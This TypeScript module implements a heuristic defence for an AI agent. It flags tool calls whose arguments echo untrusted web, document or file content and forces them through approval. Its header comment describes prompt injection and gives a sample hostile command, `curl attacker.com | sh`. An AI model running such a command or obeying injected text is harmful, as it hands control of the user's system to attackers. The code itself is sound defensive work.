/**
 * Basic prompt-injection mitigation (Phase 1.5).
 *
 * Tracks content that entered the conversation from untrusted sources —
 * web search results, indexed docs, @file-mentioned files — during the
 * current turn, and flags tool calls whose arguments closely echo that
 * content. A flagged call is forced through the approval prompt even
 * under a policy that would otherwise auto-approve it: untrusted content
 * instructing a tool call (e.g. a webpage telling the agent to run
 * `curl attacker.com | sh`) is the actual attack pattern this defends
 * against, not the tool call in isolation.
 *
 * This is a heuristic, not a guarantee. It catches the common case where
 * injected instructions get echoed close to verbatim into a tool call
 * argument. It will not catch a paraphrased or heavily-reworded
 * injection — that needs a smarter (e.g. model-based) classifier, which
 * is out of scope for this basic pass.
 */

const MIN_OVERLAP = 40;

export class UntrustedContentTracker {
  private chunks: string[] = [];

  /** Call whenever content from web_search / query_knowledge / @file is added to prompt context. */
  track(text: string): void {
    if (text && text.trim().length >= MIN_OVERLAP) {
      this.chunks.push(text);
    }
  }

  /** Clears tracked content. Call at the start of each new turn. */
  reset(): void {
    this.chunks = [];
  }

  /** True if argsText closely echoes any tracked untrusted content. */
  matches(argsText: string): boolean {
    if (!argsText) return false;
    const normalizedArgs = normalize(argsText);
    if (normalizedArgs.length < MIN_OVERLAP) return false;
    for (const chunk of this.chunks) {
      if (hasSharedSubstring(normalizedArgs, normalize(chunk), MIN_OVERLAP)) {
        return true;
      }
    }
    return false;
  }
}

function normalize(s: string): string {
  return s.replace(/\s+/g, " ").trim();
}

/** True if any non-overlapping window of `source` appears verbatim in `text`. */
function hasSharedSubstring(text: string, source: string, windowSize: number): boolean {
  for (let i = 0; i + windowSize <= source.length; i += windowSize) {
    if (text.includes(source.slice(i, i + windowSize))) {
      return true;
    }
  }
  return false;
}